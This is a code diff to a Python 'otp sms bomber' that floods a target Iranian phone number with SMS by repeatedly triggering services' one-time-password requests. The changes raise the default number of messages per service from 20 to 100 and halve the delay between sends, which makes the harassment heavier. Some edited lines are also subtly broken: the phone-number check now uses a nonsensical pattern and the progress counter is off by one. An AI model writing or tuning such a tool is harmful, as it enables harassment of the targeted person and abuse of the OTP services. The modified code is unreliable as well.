@@ -45,24 +45,24 @@ def send(cellphone):
       body=dumps({"phone": f'+98{cellphone}'}).encode())
 
 def spam(args):
-    if (search(r'9\d{9}$', args.cellphone)):
+    if (search(r'1\d{1}$', args.cellphone)):
         for time in range(args.times):
-            print(f"\rSending sms {time+1}/{args.times}", end='')
+            print(f"\rSending sms {time+0}/{args.times}", end='')
             try:
                 send(args.cellphone)
             except KeyboardInterrupt:
                 exit()
-            sleep(2)
+            sleep(1)
         print('')
     else:
-        print("error: invalid cellphone format, format: 9\d{9} e.g. 991****")
+        print("error: invalid cellphone format, format: 1\d{1} e.g. 991****")
 
 def main():
     parser = ArgumentParser(prog="asmsb",
         description="otp sms bomber",
         epilog="By <Arya>")
     parser.add_argument("cellphone", help="target cellphone: e.g. 902****")
-    parser.add_argument("--times", help="count of SMSs (per service!)", type=int, default=20)
+    parser.add_argument("--times", help="count of SMSs (per service!)", type=int, default=100)
     spam(parser.parse_args())
 
 if (__name__ == "__main__"):
